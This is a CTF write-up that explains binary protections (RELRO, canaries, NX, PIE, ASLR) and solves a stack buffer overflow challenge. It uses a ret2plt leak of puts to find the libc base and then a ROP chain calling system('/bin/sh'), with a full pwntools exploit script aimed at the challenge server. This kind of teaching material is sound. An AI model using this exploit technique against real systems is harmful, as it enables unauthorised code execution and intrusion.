## TL;DR
Classic buffer overflow (72 byte offset) with NX on, partial RELRO, no canary, PIE off. Leaked puts's real libc address with a ret2plt attack (calling puts@plt on puts@got), computed
the remote libc base from it, then built a second ROP chain calling system("/bin/sh") to pop a shell and read the flag.

Let's start by explaining some concepts we need to understand before moving on with the writeup:
### Libc
Libc (libc.so.6) is the standard C library. It provides functions like puts, printf, system, read, etc. Binaries that use these functions don't include their code directly, as it will make the file
larger, which is less optimized. Instead they're dynamically linked and resolved from libc at runtime, meaning that the binary gets their code from libc using addresses (we'll explain more about this
in the next definition).  

Libc is loaded at a randomized base address (ASLR, we'll explain it also down a bit) but functions inside it are always at a constant offset from that base. 
So, leaking one function's real address allows us to calculate the whole libc base, and from there we can get the address of any other function (like system) or string (like /bin/sh).
### GOT vs PLT
|           | PLT (Procedure Linkage Table) | GOT (Global Offset Table) |
|-----------|----------|----------|
| **What it is** | A small piece of code       | A slot that stores an address       |
| **What it does** | You call it to reach a function (like `puts`)             | Holds the real address of that function once it's known       |
| **Before resolving** | Fixed code (jmp *GOT_slot)       | No addresses, instead it points to the PLT resolver (code that resolves the real address from libc)      |
| **After resolving** | Same as before       | Now holds the real address of the function in libc       |


Now let's go over the different protections that we've seen after running **checksec** on the binary:  
### No vs Partial vs Full Relro

### Stack canaries
A random value generated by the kernel and placed right before the saved RBP (which itself sits right before the return address) on the stack. Before a function returns, the canary's case on the stack
is compared to its initial value, and if changed (because of a buffer overflow), the program crashes (stack smashing detected).  

Usually it can be bypassed either by leaking its value through a format strings vuln, or by bruteforce if some conditions are met.

### NX
Marks the stack (and other writable memory) as non-executable. This means we can't just inject shellcode onto the stack and jump to it (the CPU refuses to execute instructions from that memory).  
It's usually bypassed with ROP (reusing existing executable code).

### PIE vs ASLR
- PIE (Position Independent Executable): If on, the binary itself is loaded at a random base address each run, meaning even the binary's own addresses (functions, GOT, PLT) shift every execution.
- ASLR (Address Space Layout Randomization): an OS-level feature that randomizes the base addresses of memory regions (stack, heap, and libraries like libc) at each run. Since it's an OS-level thingie, we can't verify whether it's on or off, but it's mostly always on, so we assume that.


## Exploitation
Since we got libc among the files of the chall, this will make things much simpler. We'll have to leak a libc function remotely, calculate the offset of that specific function locally using our libc
(since we have both the address of the function and libc base), and finally substract the offset from the leaked address to figure out the remote libc base. 

Once we have our remote libc base address, we can easily get "system" & "bin/sh" addresses. We just have to get their offset locally, and then add that offset to the remote base we figured out (since
as we said in the definitions, offsets of functions in libc are constant and not affected by ASLR).  

We also have to get the address of "pop rdi; ret;" & "ret;" gadgets, which can be done using tools like ropper or ropgadget. And before any of that, we need the offset to RIP, which we can obtain by examining
RSP value after crashing the program with a cyclic pattern.  

Now we can do all of these manually even if it's annoying, however, here comes the magic of **Pwntools the goat**! All the previous steps can be automated using it, except the first one: Leaking a libc
function, **so we'll be focusing on that alone.**  

### How to leak?
Let's just verify if we have "puts" function in our binary:

Niceee, we do!

Our target to be leaked is "puts" function, but the question here is **how to get its address in the remote libc**?  
For that, we'll use a little magic trick called **ret2plt**, where we leak a GOT entry using a printing function like "puts".

Basically, we gotta grab the address of "puts" from the binary (plt entry), and also
the address of its GOT entry, which holds the resolved addreess from libc.  

Then, we call puts (PLT) and give it puts (GOT) as an argument, which will print the content of its GOT entry, giving us the libc address.

### Solve script
Now all what's left is the solve script. Since the ctf was no AI and I'm a lazy person lol, I searched for a writeup of a similar challenge, so that I can build on top of its solve script.  
Eventually I found [this one](https://ctftime.org/writeup/37244), and adapted the script to our challenge.  

```python
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.binary = elf

# r = elf.process()
r = remote('lmdps.challs.itc-ctf.online', 9229, ssl=True)

offset = 72

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])

payload = [
    b'A' * offset,
    rop.chain(),
    p64(0x0000000000401194) #main
]
payload = b''.join(payload)

r.recv()
r.sendline(payload)
puts = u64(r.recvline().strip().ljust(8, b'\x00'))
print(f'puts: {hex(puts)}')

libc.address = puts - libc.symbols['puts']

rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

payload = [
    b'A' * offset,
    p64(0x000000000040101a), #ret
    rop.chain()
]

payload = b''.join(payload)

r.recv()
r.sendline(payload)

r.interactive()
```
Let's explain a few things in the script:  
-When we do "rop.call" and feed it the function we want to call and its arguments, it automatically uses the necessary gadgets like "pop rdi; ret;".  

-We called main after calling puts in order to get another bufferoverflow and use it for our second chain to call system.  

-After we calculate "libc.address", it will be automatically recognized and used after to get addresses of other functions from the remote libc.  

-We did this "rop = ROP(libc)" to switch from grabbing the addresses from the binary to the libc.  

-"p64(0x000000000040101a), #ret" here we called ret for stack allignment, which is needed before calling system otherwise the program might crash (it actually did when testing).
